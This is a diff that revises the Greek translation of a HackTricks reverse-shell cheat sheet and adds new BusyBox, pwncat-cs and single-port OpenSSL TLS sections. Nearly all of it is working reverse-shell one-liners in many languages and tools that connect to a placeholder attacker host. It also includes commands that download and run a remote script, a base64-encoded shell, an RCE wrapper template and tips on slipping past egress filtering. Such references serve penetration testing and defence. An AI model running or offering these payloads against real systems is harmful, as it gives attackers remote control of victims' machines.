@@ -2,11 +2,11 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-**Αν έχετε ερωτήσεις σχετικά με οποιαδήποτε από αυτές τις θήκες, μπορείτε να τις ελέγξετε με** [**https://explainshell.com/**](https://explainshell.com)
+**Αν έχετε ερωτήσεις για κάποιο από αυτά τα shells, μπορείτε να τα ελέγξετε με το** [**https://explainshell.com/**](https://explainshell.com)
 
 ## Full TTY
 
-**Μόλις αποκτήσετε μια αντίστροφη θήκη**[ **διαβάστε αυτή τη σελίδα για να αποκτήσετε μια πλήρη TTY**](full-ttys.md)**.**
+**Μόλις αποκτήσετε ένα reverse shell**[ **διαβάστε αυτή τη σελίδα για να αποκτήσετε ένα full TTY**](full-ttys.md)**.**
 
 ## Bash | sh
 ```bash
@@ -21,7 +21,7 @@ exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; 
 #after getting the previous shell to get the output to execute
 exec >&0
 ```
-Μην ξεχάσετε να ελέγξετε με άλλα shells: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh και bash.
+Μην ξεχνάς να ελέγχεις και άλλα shells: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, και bash.
 
 ### Symbol safe shell
 ```bash
@@ -35,10 +35,10 @@ echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMSc
 #### Εξήγηση του Shell
 
 1. **`bash -i`**: Αυτό το μέρος της εντολής ξεκινά ένα διαδραστικό (`-i`) Bash shell.
-2. **`>&`**: Αυτό το μέρος της εντολής είναι μια συντομευμένη σημειογραφία για **την ανακατεύθυνση τόσο της κανονικής εξόδου** (`stdout`) όσο και **του κανονικού σφάλματος** (`stderr`) στον **ίδιο προορισμό**.
-3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: Αυτό είναι ένα ειδικό αρχείο που **αντιπροσωπεύει μια σύνδεση TCP στη συγκεκριμένη διεύθυνση IP και θύρα**.
-- Με **την ανακατεύθυνση των ροών εξόδου και σφάλματος σε αυτό το αρχείο**, η εντολή στέλνει αποτελεσματικά την έξοδο της διαδραστικής συνεδρίας shell στη μηχανή του επιτιθέμενου.
-4. **`0>&1`**: Αυτό το μέρος της εντολής **ανακατευθύνει την κανονική είσοδο (`stdin`) στον ίδιο προορισμό με την κανονική έξοδο (`stdout`)**.
+2. **`>&`**: Αυτό το μέρος της εντολής είναι μια σύντομη σημειογραφία για την **ανακατεύθυνση τόσο της τυπικής εξόδου** (`stdout`) όσο και της **τυπικής εξόδου σφαλμάτων** (`stderr`) στον **ίδιο προορισμό**.
+3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: Αυτό είναι ένα ειδικό αρχείο που **αντιπροσωπεύει μια TCP σύνδεση προς τη συγκεκριμένη διεύθυνση IP και θύρα**.
+- Με την **ανακατεύθυνση των ροών εξόδου και σφαλμάτων σε αυτό το αρχείο**, η εντολή στέλνει ουσιαστικά την έξοδο της διαδραστικής συνεδρίας shell στο μηχάνημα του επιτιθέμενου.
+4. **`0>&1`**: Αυτό το μέρος της εντολής **ανακατευθύνει την τυπική είσοδο (`stdin`) στον ίδιο προορισμό με την τυπική έξοδο (`stdout`)**.
 
 ### Δημιουργία σε αρχείο και εκτέλεση
 ```bash
@@ -47,11 +47,11 @@ wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.s
 ```
 ## Forward Shell
 
-Όταν ασχολείστε με μια **Remote Code Execution (RCE)** ευπάθεια σε μια εφαρμογή ιστού βασισμένη σε Linux, η επίτευξη ενός reverse shell μπορεί να εμποδιστεί από αμυντικά δίκτυα όπως οι κανόνες iptables ή περίπλοκοι μηχανισμοί φιλτραρίσματος πακέτων. Σε τέτοιες περιορισμένες συνθήκες, μια εναλλακτική προσέγγιση περιλαμβάνει τη δημιουργία ενός PTY (Pseudo Terminal) shell για να αλληλεπιδράσετε με το παραβιασμένο σύστημα πιο αποτελεσματικά.
+Όταν αντιμετωπίζεις ένα τρωτό σημείο **Remote Code Execution (RCE)** μέσα σε μια Linux-based web application, η επίτευξη ενός reverse shell μπορεί να εμποδίζεται από network defenses όπως κανόνες iptables ή πολύπλοκους μηχανισμούς packet filtering. Σε τέτοια περιορισμένα περιβάλλοντα, μια εναλλακτική προσέγγιση είναι η δημιουργία ενός PTY (Pseudo Terminal) shell για να αλληλεπιδράς πιο αποτελεσματικά με το compromised system.
 
-Ένα προτεινόμενο εργαλείο για αυτό το σκοπό είναι το [toboggan](https://github.com/n3rada/toboggan.git), το οποίο απλοποιεί την αλληλεπίδραση με το περιβάλλον στόχο.
+Ένα προτεινόμενο εργαλείο για αυτόν τον σκοπό είναι το [toboggan](https://github.com/n3rada/toboggan.git), το οποίο απλοποιεί την αλληλεπίδραση με το target environment.
 
-Για να χρησιμοποιήσετε το toboggan αποτελεσματικά, δημιουργήστε ένα Python module προσαρμοσμένο στο RCE πλαίσιο του συστήματος στόχου σας. Για παράδειγμα, ένα module με όνομα `nix.py` θα μπορούσε να δομηθεί ως εξής:
+Για να χρησιμοποιήσεις το toboggan αποτελεσματικά, δημιούργησε ένα Python module προσαρμοσμένο στο RCE context του target system σου. Για παράδειγμα, ένα module με όνομα `nix.py` θα μπορούσε να δομηθεί ως εξής:
 ```python3
 import jwt
 import httpx
@@ -75,21 +75,21 @@ response.raise_for_status()
 
 return response.text
 ```
-Και μετά, μπορείτε να εκτελέσετε:
+Και μετά, μπορείς να εκτελέσεις:
 ```shell
 toboggan -m nix.py -i
 ```
-Για να εκμεταλλευτείτε άμεσα ένα διαδραστικό shell. Μπορείτε να προσθέσετε `-b` για την ενσωμάτωση του Burpsuite και να αφαιρέσετε το `-i` για μια πιο βασική περιτύλιξη rce.
+Για να εκμεταλλευτείτε απευθείας ένα interractive shell. Μπορείτε να προσθέσετε `-b` για integration με Burpsuite και να αφαιρέσετε το `-i` για ένα πιο βασικό rce wrapper.
 
-Μια άλλη δυνατότητα είναι η χρήση της υλοποίησης forward shell του `IppSec` [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell).
+Μια άλλη δυνατότητα είναι να χρησιμοποιήσετε την υλοποίηση forward shell του `IppSec` [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell).
 
-Απλά χρειάζεται να τροποποιήσετε:
+Χρειάζεται μόνο να τροποποιήσετε:
 
-- Τη διεύθυνση URL του ευάλωτου host
-- Το πρόθεμα και το επίθημα του payload σας (αν υπάρχει)
-- Τον τρόπο αποστολής του payload (κεφαλίδες; δεδομένα; επιπλέον πληροφορίες;)
+- Το URL του ευάλωτου host
+- Το prefix και το suffix του payload σας (αν υπάρχουν)
+- Τον τρόπο αποστολής του payload (headers? data? extra info?)
 
-Στη συνέχεια, μπορείτε απλά να **στείλετε εντολές** ή ακόμα και **να χρησιμοποιήσετε την εντολή `upgrade`** για να αποκτήσετε ένα πλήρες PTY (σημειώστε ότι οι σωλήνες διαβάζονται και γράφονται με καθυστέρηση περίπου 1.3 δευτερολέπτων).
+Έπειτα, μπορείτε απλώς να **στείλετε commands** ή ακόμα και να **χρησιμοποιήσετε την εντολή `upgrade`** για να πάρετε ένα πλήρες PTY (σημειώστε ότι τα pipes διαβάζονται και γράφονται με μια κατά προσέγγιση καθυστέρηση 1.3s).
 
 ## Netcat
 ```bash
@@ -98,6 +98,18 @@ nc <ATTACKER-IP> <PORT> | /bin/sh #Blind
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER-IP> <PORT> >/tmp/f
 nc <ATTACKER-IP> <PORT1>| /bin/bash | nc <ATTACKER-IP> <PORT2>
 rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
+```
+## BusyBox
+
+Πολύ συνηθισμένο σε **routers**, **embedded devices**, **containers** και απλοποιημένες Linux appliances. Αν δεν υπάρχει αυτόνομο `nc`, έλεγξε αν το BusyBox το παρέχει:
+```bash
+busybox --list-full | grep -E '(^|/)nc$'
+busybox nc <ATTACKER-IP> <PORT> -e /bin/sh
+busybox nc <ATTACKER-IP> <PORT> -e sh
+```
+Αν υπάρχει το `busybox nc` αλλά η διαδραστική εκτέλεση είναι ασταθής, το pattern FIFO από την ενότητα `nc` συνήθως εξακολουθεί να λειτουργεί:
+```bash
+rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|busybox nc <ATTACKER-IP> <PORT> >/tmp/f
 ```
 ## gsocket
 
@@ -120,7 +132,7 @@ while true; do nc -l <port>; done
 ```
 Για να στείλετε την εντολή, γράψτε την, πατήστε enter και πατήστε CTRL+D (για να σταματήσετε το STDIN)
 
-**Θύμα**
+**Victim**
 ```bash
 export X=Connected; while true; do X=`eval $(whois -h <IP> -p <Port> "Output: $X")`; sleep 1; done
 ```
@@ -137,7 +149,7 @@ python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socke
 perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
 ```
-## Ρούμπι
+## Ruby
 ```bash
 ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
@@ -165,7 +177,7 @@ p.waitFor()
 victim> ncat <ip> <port,eg.443> --ssl  -c  "bash -i 2>&1"
 attacker> ncat -l <port,eg.443> --ssl
 ```
-## Γκολάν
+## Golang
 ```bash
 echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
 ```
@@ -226,7 +238,7 @@ zsh -c 'zmodload zsh/net/tcp; ztcp <ATTACKER-IP> <PORT>; zsh -i <&$REPLY >&$REPL
 ```
 ## Rustcat (rcat)
 
-[https://github.com/robiot/rustcat](https://github.com/robiot/rustcat) – σύγχρονος listener παρόμοιος με το netcat γραμμένος σε Rust (συσκευασμένος στο Kali από το 2024).
+[https://github.com/robiot/rustcat](https://github.com/robiot/rustcat) – σύγχρονος listener τύπου netcat γραμμένος σε Rust (πακεταρισμένος στο Kali από το 2024).
 ```bash
 # Attacker – interactive TLS listener with history & tab-completion
 rcat listen -ib 55600
@@ -237,13 +249,26 @@ curl -L https://github.com/robiot/rustcat/releases/latest/download/rustcat-x86_6
 && /tmp/rcat connect -s /bin/bash <ATTACKER-IP> 55600
 ```
 Χαρακτηριστικά:
-- Προαιρετική σημαία `--ssl` για κρυπτογραφημένη μεταφορά (TLS 1.3)
-- `-s` για να εκκινήσει οποιοδήποτε δυαδικό (π.χ. `/bin/sh`, `python3`) στον θύμα
-- `--up` για αυτόματη αναβάθμιση σε πλήρως διαδραστικό PTY
+- Προαιρετικό `--ssl` flag για κρυπτογραφημένη μεταφορά (TLS 1.3)
+- `-s` για να εκκινήσει οποιοδήποτε binary (π.χ. `/bin/sh`, `python3`) στο victim
+- `--up` για αυτόματη αναβάθμιση σε πλήρως interactive PTY
 
-## revsh (κρυπτογραφημένο & έτοιμο για pivot)
+## pwncat-cs
 
-`revsh` είναι ένας μικρός πελάτης/διακομιστής C που παρέχει πλήρες TTY μέσω ενός **κρυπτογραφημένου καναλιού Diffie-Hellman** και μπορεί προαιρετικά να συνδεθεί σε μια **διεύθυνση TUN/TAP** για αναστροφή παρόμοια με VPN.
+Αν έχεις ήδη **any raw reverse shell** αλλά θέλεις έναν listener που προσπαθεί αυτόματα να τον αναβαθμίσει σε μια πιο χρήσιμη session, το `pwncat-cs` είναι μια καλή σύγχρονη αντικατάσταση για έναν απλό `nc -lvnp` listener.
+```bash
+# Attacker - catch a plain reverse shell and auto-upgrade it when possible
+python3 -m pip install --user pwncat-cs
+pwncat-cs -lp 4444
+
+# Victim - reuse any payload from this page
+bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/4444 0>&1'
+```
+Υποστηρίζει επίσης **encrypted** `ssl-bind` και `ssl-connect` channels, οπότε μπορείς να το συνδυάσεις με `ncat --ssl` ή `socat OPENSSL:` payloads όταν χρειάζεσαι transport encryption.
+
+## revsh (encrypted & pivot-ready)
+
+Το `revsh` είναι ένα μικρό C client/server που παρέχει πλήρες TTY μέσω ενός **encrypted Diffie-Hellman tunnel** και μπορεί προαιρετικά να συνδέσει ένα **TUN/TAP** interface για reverse VPN-like pivoting.
 ```bash
 # Build (or grab a pre-compiled binary from the releases page)
 git clone https://github.com/emptymonkey/revsh && cd revsh && make
@@ -257,19 +282,28 @@ revsh -c 0.0.0.0:443 -key key.pem -cert cert.pem
 Χρήσιμες σημαίες:
 - `-b` : bind-shell αντί για reverse
 - `-p socks5://127.0.0.1:9050` : proxy μέσω TOR/HTTP/SOCKS
-- `-t` : δημιουργία διεπαφής TUN (reverse VPN)
+- `-t` : δημιουργεί ένα TUN interface (reverse VPN)
 
-Επειδή η ολόκληρη συνεδρία είναι κρυπτογραφημένη και πολυπλεξία, συχνά παρακάμπτει απλό φιλτράρισμα εξόδου που θα σκότωνε μια απλή `/dev/tcp` shell.
+Επειδή όλη η συνεδρία είναι κρυπτογραφημένη και multiplexed, συχνά παρακάμπτει απλό egress filtering που θα έκοβε ένα plain-text `/dev/tcp` shell.
 
 ## OpenSSL
 
-Ο Επιτιθέμενος (Kali)
+Ένα **single-port encrypted reverse shell** είναι συνήθως πιο πρακτικό από το κλασικό two-listener pattern, επειδή είναι πιο εύκολο να γίνει proxy μέσω `443` και απλούστερο να αυτοματοποιηθεί.
+
+Ο Attacker (Kali)
 ```bash
 openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
-openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
-openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
+openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port>
 ```
-Ο Θύμα
+Το Θύμα
+```bash
+#Linux - one-port TLS shell using a named pipe
+mkfifo /tmp/.s; /bin/sh -i </tmp/.s 2>&1 | openssl s_client -quiet -connect <ATTACKER_IP>:<PORT> >/tmp/.s; rm /tmp/.s
+
+#If the target needs SNI / hostname validation to blend with a fronted TLS service
+mkfifo /tmp/.s; /bin/sh -i </tmp/.s 2>&1 | openssl s_client -quiet -servername <DOMAIN> -verify_return_error -verify_hostname <DOMAIN> -connect <ATTACKER_IP>:<PORT> >/tmp/.s; rm /tmp/.s
+```
+Μπορείς ακόμα να χρησιμοποιήσεις το κλασικό pattern **two-listener** όταν θέλεις ξεχωριστά κανάλια input/output:
 ```bash
 #Linux
 openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
@@ -286,7 +320,7 @@ openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_cli
 victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
 attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337
 ```
-### Αντίστροφη Σέλα
+### Reverse shell
 ```bash
 attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
 victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
@@ -301,9 +335,9 @@ awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s;
 ```bash
 while true; do nc -l 79; done
 ```
-Για να στείλετε την εντολή, γράψτε την, πατήστε enter και πατήστε CTRL+D (για να σταματήσετε το STDIN)
+Για να στείλεις την εντολή, γράψε την, πάτησε enter και μετά CTRL+D (για να σταματήσει το STDIN)
 
-**Θύμα**
+**Victim**
 ```bash
 export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null')`; sleep 1; done
 
@@ -347,7 +381,7 @@ Xnest :1
 ```
 ## Groovy
 
-by [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) ΣΗΜΕΙΩΣΗ: Η αντίστροφη θήκη Java λειτουργεί επίσης για το Groovy
+από [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) ΣΗΜΕΙΩΣΗ: Java reverse shell επίσης δουλεύει για Groovy
 ```bash
 String host="localhost";
 int port=8044;
@@ -362,5 +396,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 - [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 - [https://github.com/robiot/rustcat](https://github.com/robiot/rustcat)
 - [https://github.com/emptymonkey/revsh](https://github.com/emptymonkey/revsh)
+- [https://github.com/calebstewart/pwncat](https://github.com/calebstewart/pwncat)
+- [https://gtfobins.org/gtfobins/busybox/](https://gtfobins.org/gtfobins/busybox/)
 
 {{#include ../../banners/hacktricks-training.md}}
